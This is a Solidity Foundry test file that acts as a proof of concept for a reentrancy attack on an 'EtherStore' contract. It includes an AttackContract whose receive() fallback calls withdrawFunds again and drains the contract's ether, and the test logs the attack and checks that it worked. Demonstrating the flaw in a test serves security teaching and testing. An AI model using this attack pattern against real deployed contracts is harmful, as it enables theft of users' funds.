// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherstore.sol";

contract EtherStoreReentrancyTest is Test {
    EtherStore public etherStore;
    AttackContract public attacker;
    address victim = address(0x123);
    uint256 public constant DEPOSIT_AMOUNT = 0.5 ether;

    function setUp() public {
        etherStore = new EtherStore();
        attacker = new AttackContract(etherStore);

        // Provide initial ETH to victim and attacker
        vm.deal(victim, DEPOSIT_AMOUNT);
        vm.deal(address(attacker), DEPOSIT_AMOUNT);

        // Victim and attacker deposit funds
        vm.prank(victim);
        etherStore.depositFunds{value: DEPOSIT_AMOUNT}();
        attacker.deposit{value: DEPOSIT_AMOUNT}();

        // Advance time to bypass withdrawal time lock
        vm.warp(1 weeks + 1 seconds);
    }

    function testReentrancyExploit() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Capture pre-attack state
        uint256 contractBalanceBefore = address(etherStore).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerContractBalanceBefore = etherStore.getUserBalance(address(attacker));
        uint256 victimContractBalanceBefore = etherStore.getUserBalance(victim);
        
        console2.log("Contract ETH balance:", contractBalanceBefore);
        console2.log("Attacker ETH balance:", attackerBalanceBefore);
        console2.log("Attacker's deposit balance:", attackerContractBalanceBefore);
        console2.log("Victim's deposit balance:", victimContractBalanceBefore);

        console2.log("--- Trigger Attack ---");
        // Execute reentrancy attack
        attacker.attack(DEPOSIT_AMOUNT);

        console2.log("--- AFTER-Trigger State ---");
        // Capture post-attack state
        uint256 contractBalanceAfter = address(etherStore).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerContractBalanceAfter = etherStore.getUserBalance(address(attacker));
        uint256 victimContractBalanceAfter = etherStore.getUserBalance(victim);
        
        console2.log("Contract ETH balance:", contractBalanceAfter);
        console2.log("Attacker ETH balance:", attackerBalanceAfter);
        console2.log("Attacker's deposit balance:", attackerContractBalanceAfter);
        console2.log("Victim's deposit balance:", victimContractBalanceAfter);

        // Verify state changes
        console2.log("--- Verification ---");
        bool contractBalanceDrained = contractBalanceAfter == 0;
        bool attackerGained = attackerBalanceAfter == (2 * DEPOSIT_AMOUNT) + attackerBalanceBefore;
        bool attackerContractBalanceZero = attackerContractBalanceAfter == 0;
        bool victimBalanceUnchanged = victimContractBalanceAfter == victimContractBalanceBefore;

        bool vulnerabilityExists = contractBalanceDrained &&
            attackerGained &&
            attackerContractBalanceZero &&
            victimBalanceUnchanged;

        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrant attack successfully drained contract funds");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to generate reentrancy effects");
        }

        // Original validation assertions
        assertEq(
            address(etherStore).balance,
            0,
            "Contract balance not drained"
        );
        assertEq(
            address(attacker).balance,
            2 * DEPOSIT_AMOUNT + attackerBalanceBefore,
            "Incorrect attacker balance"
        );
        assertEq(
            etherStore.getUserBalance(victim),
            DEPOSIT_AMOUNT,
            "Victim balance incorrect"
        );
    }
}

contract AttackContract {
    EtherStore public immutable etherStore;
    uint256 private count;

    constructor(EtherStore _etherStore) {
        etherStore = _etherStore;
    }

    function deposit() public payable {
        etherStore.depositFunds{value: msg.value}();
    }

    function attack(uint256 _amount) public {
        count = 0;
        etherStore.withdrawFunds(_amount);
    }

    receive() external payable {
        if (count++ == 0) {
            etherStore.withdrawFunds(msg.value);
        }
    }
}